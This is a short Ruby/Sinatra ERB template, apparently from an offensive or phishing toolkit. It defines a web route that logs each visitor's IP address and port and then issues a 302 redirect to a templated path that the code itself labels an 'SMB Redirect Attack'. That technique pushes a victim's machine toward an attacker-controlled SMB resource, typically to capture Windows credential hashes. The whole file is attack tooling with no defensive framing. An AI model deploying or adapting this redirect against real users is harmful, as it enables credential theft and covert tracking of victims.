# encoding: utf-8
# Documentation: This is the SMBRedirect redirect
class <%= self.webserver %> < Sinatra::Base
  get "<%= self.request_path || "/download" %>" do
    process_info
    redir = "<%= self.redirect_path  %>" + rand().to_s
    log "#{Time.now} - IP #{request.ip} PORT #{request.port} - Redirecting User to SMB Redirect Attack #{redir}"

    status 302
    response['Location'] = redir
    ""
  end
end
